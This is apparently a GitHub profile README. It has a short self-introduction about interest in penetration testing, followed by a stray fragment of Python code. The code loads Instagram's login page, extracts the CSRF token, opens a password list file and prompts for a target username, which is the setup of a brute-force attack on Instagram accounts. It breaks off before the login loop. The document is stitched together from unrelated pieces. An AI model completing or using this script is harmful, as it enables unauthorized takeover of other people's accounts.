- 👋 Hi, I’m @emadtermux
- 🫐 I’m interested in Platform security and advanced penetration testing (hacking) 
- 🌱 I’m currently learning Regarding my interests, which I mentioned above.  
-🌼 I like being human and having a conscience, while also being humorous and kind, because that's who I am. 

<!---
emadtermux/emadtermux is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
link = 'https://www.instagram.com/accounts/login/'

response = session.get(link)
csrf = response.cookies['csrftoken']

time = int(datetime.now().timestamp())


passwords = open('h.txt', 'r')
username = str(input('Enter your username or gmail: '))
